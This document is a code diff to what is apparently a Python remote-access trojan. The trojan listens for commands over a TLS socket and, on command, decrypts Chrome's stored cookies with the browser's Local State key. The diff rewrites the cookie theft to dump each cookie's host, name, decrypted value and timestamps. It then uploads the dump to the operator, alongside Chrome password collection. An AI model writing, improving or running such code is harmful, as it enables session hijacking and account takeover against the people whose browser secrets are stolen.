@@ -1,4 +1,3 @@
-# replace mss with pyautogui for screenshots
 import socket
 import json
 import subprocess
@@ -22,6 +21,9 @@ import base64
 from win32.win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 import sqlite3
+from base64 import b64decode
+from Cryptodome.Cipher.AES import new, MODE_GCM
+from os.path import expandvars
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
 s = ssl.wrap_socket(s)
@@ -211,7 +213,14 @@ def info():
     return f'Hostname: {hostname}\nUsername: {username}\nOS: {os_name}\nVersion/Build: {os_version}\nArchitecture: {os_architecture}'
 
 def get_chrome_datetime(chromedate):
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+    else:
+        return ""
 
 def get_chrome_local_state():
     local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
@@ -283,20 +292,52 @@ def get_chrome_passwords():
     byte_array = bytes(data, 'utf-8')
     return byte_array
 
-def get_chrome_cookies(db=None):
-    from base64 import b64decode
-    from Cryptodome.Cipher.AES import new, MODE_GCM
-    if db is None:
-        from os.path import expandvars
-        db = expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Default/Network/Cookies')
-    with open(db + '/../../../Local State') as f:
-        key = CryptUnprotectData(b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:])[1]
-    conn = sqlite3.connect(db)
-    conn.create_function('decrypt', 1, lambda v: new(key, MODE_GCM, v[3:15]).decrypt(v[15:-16]).decode())
-    data = dict(conn.execute("SELECT name, decrypt(encrypted_value) FROM cookies"))
-    conn.close()
-    cookies = json.dumps(data, indent=4)
-    byte_array = bytes(cookies, 'utf-8')
+def get_chrome_cookies():
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+    filename = "Cookies.db"
+    if not os.path.isfile(filename):
+        shutil.copyfile(db_path, filename)
+    db = sqlite3.connect(filename)
+
+    db.text_factory = lambda b: b.decode(errors="ignore")
+    cursor = db.cursor()
+    cursor.execute("""
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies""")
+    key = get_chrome_encryption_key()
+    data = '' 
+    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+        if not value:
+            decrypted_value = decrypt_chrome_password(encrypted_value, key)
+        else:
+            decrypted_value = value
+
+        data += f"""
+        Host: {host_key}
+        Cookie name: {name}
+        Cookie value (decrypted): {decrypted_value}
+        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
+        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
+        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
+        ===============================================================
+        """
+        cursor.execute("""
+        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+        WHERE host_key = ?
+        AND name = ?""", (decrypted_value, host_key, name))
+    cursor.close()
+    db.close()
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+    byte_array = bytes(data, 'utf-8')
+    return byte_array
+
+def get_cookies_and_upload():
+    byte_array = get_chrome_cookies()
     byte_arr_io = io.BytesIO(byte_array)
     upload_byte_arr(byte_arr_io)
 
@@ -356,7 +397,7 @@ def shell():
                     reliable_send('Cannot Perform Chrome Password Collection!')
             case 'chrome_cookies':
                 try:
-                    get_chrome_cookies()
+                    get_cookies_and_upload()
                 except:
                     reliable_send('Cannot Perform Chrome Cookie Collection!')
             case 'check':
